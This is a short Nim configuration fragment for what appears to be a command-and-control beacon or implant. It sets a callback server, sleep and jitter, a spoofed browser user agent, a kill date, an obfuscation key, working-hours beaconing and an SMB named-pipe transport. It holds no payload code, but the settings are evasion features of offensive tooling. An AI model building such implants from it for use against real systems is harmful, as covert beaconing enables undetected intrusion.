# Compile-time config injected via -d: flags
const ServerUrl*   {.strdefine.} = "http://127.0.0.1:8080"
const Transport*   {.strdefine.} = "http"
const SleepSec*    {.intdefine.} = 60
const JitterPct*   {.intdefine.} = 20
const UserAgent*   {.strdefine.} = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
const BeaconURIs*  {.strdefine.} = ""
const ProxyUrl*    {.strdefine.} = ""
const KillDate*       {.strdefine.} = ""
const ObfKey*         {.strdefine.} = ""
const WorkingHours*   {.strdefine.} = ""  # "HH:MM-HH:MM", empty = always beacon
const SMBPipe*     {.strdefine.} = "endgamepipe"  # named pipe for smb transport
